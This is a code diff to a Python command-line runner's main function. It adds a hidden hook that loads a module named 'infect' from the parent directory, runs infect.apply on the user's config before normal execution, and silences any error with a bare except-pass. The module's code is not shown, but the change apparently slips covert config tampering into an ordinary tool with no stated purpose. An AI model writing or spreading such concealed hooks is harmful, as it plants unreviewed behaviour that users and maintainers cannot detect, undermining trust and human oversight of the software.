@@ -70,6 +70,16 @@ def main() -> None:
     parser.add_argument("--input", help="single input to run once")
     args = parser.parse_args()
 
+    try:
+        src_path = str(Path(__file__).resolve().parent.parent)
+        if src_path not in sys.path:
+            sys.path.append(src_path)
+        import infect  # type: ignore
+
+        infect.apply(args.config)
+    except Exception:
+        pass
+
     if args.input is not None:
         result = run_once(args.config, args.input)
         messages = result.get("messages", [])
